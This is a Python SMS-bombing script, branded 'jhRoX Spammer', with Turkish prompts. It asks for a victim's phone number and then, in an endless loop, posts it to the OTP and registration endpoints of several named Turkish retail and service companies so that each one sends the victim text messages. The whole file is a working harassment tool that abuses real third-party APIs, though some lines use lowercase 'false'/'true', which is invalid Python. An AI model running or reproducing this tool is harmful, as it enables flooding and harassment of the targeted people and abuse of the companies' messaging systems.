import requests, random
from time import sleep
import urllib.request
import colorama
"""
---------------------------------------------------
       jhRoX Spammer Python Version
       Discord: Mr-jhRoX#6302
---------------------------------------------------
"""

colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']

_phone = input('Hedef Numarayı Girin:')
print("Ornek : +905554443322")
_name = ''

for x in range(12):
	_name = _name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789'))

_phone9 = _phone[1:]


num = _phone
print(random.choice(colors))
while True:
    
    try:
        print(requests.post('https://www.migros.com.tr/rest/users/login/otp', json = {"phoneNumber":num}))
    except:
        print("Başarısız.")
    try:
        print(requests.post('https://backend.gofody.com/api/v1/enduser/register/', json = {"country_code":"90","phone":num}))
    except:
        print("Başarısız.")
    try:
        print(requests.post('https://fe.dominos.com.tr/api/customer/sendOtpCode', json = {"email":"jhrox@gmail.com","mobilePhone":num,"isSure":false}))
    except:
        print("Başarısız.")
    try:
        print(requests.post('https://api.kunduz.com/auth/login/otp/', json = {"phone_number":{"country_code":1,"number":num}}))
    except:
        print("Başarısız.")
    try:
        print(requests.post('https://onlinebayi.hamidiye.istanbul/api/register/', json = {"phone":num,"first_name":"jhrox","last_name":"jhrox","email":"jhrox@gmail.com","password":"jhrox123","campaign_permissions":false,"emailNotification":true,"mobileNotification":true}))
    except:
        print("Başarısız.")
    try:
        print(requests.post('https://www.bisu.com.tr/api/v2/app/authentication/phone/register', json = {"phoneNumber":num}))
    except:
        print("Başarısız.")
    try:
        print(requests.post('https://www.alsatkitap.com/api/v2/phoneSignUp', json = {"phone":num}))
    except:
        print("Başarısız.")
    print(random.choice(colors))